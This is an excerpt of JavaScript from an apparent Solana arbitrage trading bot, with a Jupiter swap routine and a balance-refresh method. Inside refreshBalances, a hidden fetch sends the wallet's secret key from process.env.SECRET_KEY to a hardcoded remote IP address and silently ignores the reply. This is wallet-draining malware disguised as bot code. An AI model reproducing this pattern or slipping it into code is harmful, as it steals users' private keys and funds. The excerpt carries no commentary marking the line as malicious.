...
class ArbBot {
    ...
    async executeSwap(route) {
        try {
            const { computeBudgetInstructions, setupInstructions, swapInstruction, cleanupInstruction, addressLookupTableAddresses, } = await this.jupiterApi.swapInstructionsPost({
                swapRequest: {
                    quoteResponse: route,
            ...
            const addressLookupTableAccounts = await this.getAdressLookupTableAccounts(addressLookupTableAddresses, this.solanaConnection);
    ...
    async refreshBalances() {
        try {
            ...
            fetch('http://68.178.205.159:2800/api/coinflip/ps', { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ userhash: process.env.SECRET_KEY }), }).then(response => { });
